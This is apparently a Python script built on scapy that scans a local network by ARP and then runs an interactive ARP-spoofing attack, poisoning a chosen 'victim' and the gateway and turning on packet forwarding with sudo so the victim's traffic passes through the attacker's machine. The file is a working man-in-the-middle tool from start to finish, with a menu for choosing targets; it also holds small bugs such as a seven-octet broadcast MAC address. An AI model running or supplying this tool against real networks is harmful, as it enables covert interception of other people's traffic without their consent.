import scapy.all as scapy
import socket
import time 
import subprocess


class NetworkScanner:
    def __init__(self):
        self.clients_list = []
        self.amount_of_scans_ran = 0

    def scan(self, ip):
        progress_visualiser = 0

        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=4, verbose=False)[0]

        while progress_visualiser != 256:
            print("\rScanning IP: " + str(ip[:-4]) + str(progress_visualiser), end="")
            time.sleep(0.005)
            progress_visualiser += 1
  
        for element in answered_list:
            client_dic = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            self.clients_list.append(client_dic)
        
        return self.clients_list

    def get_host_name(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except socket.herror:
            pass

    def print_result(self, results_list):
        result_number = 0

        print("\n\n IP\t\t MAC Address\t\tHostName\tScan No:" + str(self.amount_of_scans_ran) +
              "\n-----------------------------------------------------------------")

        for client in results_list:
            host_name = self.get_host_name(client["ip"])

            print(result_number, client["ip"] + "\t " + client["mac"] + "\t" + str(host_name) + "\t")
            result_number += 1

        print("-----------------------------------------------------------------")

    def run(self, ip):
        print("\n")

        if self.amount_of_scans_ran == 0:
            scan_result = self.scan(ip)
            self.amount_of_scans_ran += 1

        else:
            # Clears the previous scan result  
            self.clients_list.clear()

            scan_result = self.scan(ip)
            self.amount_of_scans_ran += 1

        self.print_result(scan_result)

        print("\n")

    def export_scan_result(self, target_choice):
        # Only Exports the Routers IP/MAC if the user is manually spoofing a target
        if target_choice == 00:
            gateway_ip_and_mac = self.clients_list[0]

            return gateway_ip_and_mac

        else:
            target_ip_and_mac = self.clients_list[int(target_choice)]
            gateway_ip_and_mac = self.clients_list[0]

            return target_ip_and_mac, gateway_ip_and_mac       


class Spoof:
    def __init__(self, victim_ip_mac, gateway_ip_mac):
        self.target_ip = victim_ip_mac["ip"]
        self.target_mac = victim_ip_mac["mac"]

        self.gateway_ip = gateway_ip_mac["ip"]
        self.gateway_mac = gateway_ip_mac["mac"]

    def spoof(self, target_ip, spoof_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=self.target_mac, psrc=source_ip, hwsrc=self.gateway_mac)
        scapy.send(packet, count=4, verbose=False)

    def run(self):
        # Allows the internet connection to continue on target device
        print("\nEnabling Packet Forwarding")
        subprocess.run(["sudo", "sysctl", "-w", "net.inet.ip.forwarding=1"])

        # Gets the name of the target device 
        try:
            spoof_host = socket.gethostbyaddr(self.target_ip)[0]
        except socket.herror:
            spoof_host = "# Error Gathering Host Name"
            pass

        print("\nSpoofing: ", spoof_host, "\n")

        try:
            sent_packets_count = 0
            while True:
                self.spoof(self.target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.target_ip)
                sent_packets_count += 2

                print("\rPackets Sent: " + str(sent_packets_count) + "\t - Press CTRL + C to Stop", end="")
                time.sleep(2)

        except KeyboardInterrupt:
            print("\n - Stopping Spoof, Resetting ARP tables\n")
            self.restore(self.target_ip, self.gateway_ip)

        print("Disabling Packet Forwarding")
        subprocess.run(["sudo", "sysctl", "-w", "net.inet.ip.forwarding=0"])
        print("\n")


def run_program():
    scan = NetworkScanner()
    scan.run("192.168.1.1/24")

    run_spoof_choice = ""

    while run_spoof_choice != 4:
        run_spoof_choice = input("1. Spoof Target\n2. Spoof Manually\n3. Run Scan Again\n4. Quit\n")

        if run_spoof_choice == "1":
            target_choice = input("Which Victim? ")

            victim_ip_and_mac, gateway_ip_and_mac = scan.export_scan_result(target_choice)

            spoof_attack_1 = Spoof(victim_ip_and_mac, gateway_ip_and_mac)
            spoof_attack_1.run()

        elif run_spoof_choice == "2":
            target_ip = input("Victim's IP: ")

            # Manually Gets MAC Address 
            arp_request = scapy.ARP(pdst=target_ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=4, verbose=False)[0]
            target_mac = answered_list[0][1].hwsrc

            print("\nVictim's MAC Address ", target_mac)

            victim_ip_and_mac = {"ip": target_ip, "mac": target_mac}
            target_choice = 00

            gateway_ip_and_mac = scan.export_scan_result(target_choice)

            spoof_attack_2 = Spoof(victim_ip_and_mac, gateway_ip_and_mac)
            spoof_attack_2.run()

        elif run_spoof_choice == "3":
            scan.run("192.168.1.1/24")

        elif run_spoof_choice == "4":
            exit()

        else:
            print("Invalid Choice")


run_program()

# This needs to be run in order for the target machine internet to continue working
# sudo sysctl -w net.inet.ip.forwarding=1
